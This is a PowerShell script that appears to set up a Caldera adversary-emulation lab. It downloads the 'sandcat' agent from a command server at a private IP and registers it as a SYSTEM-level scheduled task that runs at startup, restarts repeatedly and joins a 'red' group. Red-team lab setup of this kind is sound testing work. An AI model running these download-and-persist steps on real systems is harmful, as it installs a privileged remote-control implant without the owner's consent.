$ErrorActionPreference = 'Continue'
$logDir = 'C:\ProgramData\Caldera'
$agent = Join-Path $logDir 'sandcat.exe'
$server = 'http://10.10.0.81:8888'
New-Item -ItemType Directory -Path $logDir -Force | Out-Null
Start-Transcript -Path (Join-Path $logDir 'startup.log') -Append | Out-Null

Get-Process sandcat -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri "$server/file/download" -Headers @{ file = 'sandcat.go'; platform = 'windows' } -OutFile $agent -UseBasicParsing -TimeoutSec 90

$action = New-ScheduledTaskAction -Execute $agent -Argument "-server $server -group red"
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero)
Register-ScheduledTask -TaskName 'CalderaSandcat' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
Start-ScheduledTask -TaskName 'CalderaSandcat'
Start-Sleep -Seconds 20
Get-ScheduledTask -TaskName 'CalderaSandcat' | Select-Object TaskName, State
Get-Process sandcat -ErrorAction SilentlyContinue | Select-Object Id, ProcessName, Path
Stop-Transcript | Out-Null
